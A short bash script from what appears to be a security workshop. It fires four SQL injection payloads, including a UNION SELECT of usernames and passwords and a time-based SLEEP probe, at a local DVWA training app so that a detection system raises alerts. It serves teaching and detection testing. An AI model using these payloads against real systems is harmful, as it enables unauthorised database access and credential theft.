#!/usr/bin/env bash
# attack-sqli.sh — Fire a series of SQL injection payloads at DVWA.
# Used in the workshop to demonstrate detection. Safe: only touches local DVWA.

set -e
TARGET="${TARGET:-http://localhost:8080}"

payloads=(
  "1' OR '1'='1"
  "1' UNION SELECT user,password FROM users-- -"
  "1' AND SLEEP(2)-- -"
  "1' OR 1=1-- -"
)

echo "[sqli] target=${TARGET}"
for p in "${payloads[@]}"; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$p")
  url="${TARGET}/vulnerabilities/sqli/?id=${enc}&Submit=Submit"
  printf "  → %s\n" "$p"
  curl -s -o /dev/null -A "sqlmap/1.8" "$url"
  sleep 0.3
done
echo "[sqli] done — check http://localhost:8000 for AI alerts"
